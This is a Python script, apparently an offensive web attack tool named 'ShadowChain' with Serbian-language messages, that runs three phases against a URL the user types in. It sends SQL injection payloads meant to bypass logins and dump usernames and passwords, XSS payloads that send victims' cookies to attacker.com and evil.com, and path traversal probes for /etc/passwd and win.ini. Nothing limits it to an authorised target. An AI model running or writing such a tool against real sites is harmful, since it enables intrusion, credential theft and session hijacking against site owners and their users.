import requests
from urllib.parse import urlencode
from datetime import datetime
from pathlib import Path
import json
import re

target = input("Unesi metu (URL): ").strip()
log = []
ts = datetime.now().strftime("%Y%m%d_%H%M%S")

print("\n[ShadowChain] Faza 1: SQLi Recon")

sql_payloads = [
    "' OR '1'='1",
    "' UNION SELECT null, username, password FROM users--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR EXISTS(SELECT * FROM users)--"
]

user_dump = None
for payload in sql_payloads:
    url = f"{target}?{urlencode({'q': payload})}"
    try:
        r = requests.get(url, timeout=6)
        content = r.text
        log.append({"faza": "SQLi", "payload": payload, "status": r.status_code})

        if "users" in content or "admin" in content or "token" in content:
            print(f"[+] Mogući korisnički podaci detektovani sa: {payload}")
            user_dump = content
            break
    except Exception as e:
        print(f"[!] SQLi greška: {e}")

print("\n[ShadowChain] Faza 2: XSS Token Hook")

xss_payloads = [
    "<script>fetch('http://attacker.com/log?c='+document.cookie)</script>",
    "<img src=x onerror=fetch('http://evil.com?token='+document.cookie)>"
]

for payload in xss_payloads:
    url = f"{target}?{urlencode({'q': payload})}"
    try:
        r = requests.get(url)
        log.append({"faza": "XSS", "payload": payload, "status": r.status_code})
        print(f"[+] XSS test poslat: {payload}")
    except Exception as e:
        print(f"[!] XSS greška: {e}")

print("\n[ShadowChain] Faza 3: LFI Test")

lfi_endpoints = ["file", "page", "path"]
lfi_paths = ["../../etc/passwd", "../windows/win.ini"]

for param in lfi_endpoints:
    for path in lfi_paths:
        url = f"{target}?{urlencode({param: path})}"
        try:
            r = requests.get(url)
            log.append({"faza": "LFI", "param": param, "path": path, "status": r.status_code})
            if "root:x:" in r.text:
                print(f"[!!!] LFI uspešan: {url}")
        except Exception as e:
            print(f"[!] LFI greška: {e}")

# Sačuvaj rezultate
Path("reports").mkdir(exist_ok=True)
out_file = f"reports/shadowchain_{ts}.json"
with open(out_file, "w") as f:
    json.dump(log, f, indent=2)

print(f"\n[✓] ShadowChain završen. Log sačuvan u: {out_file}")
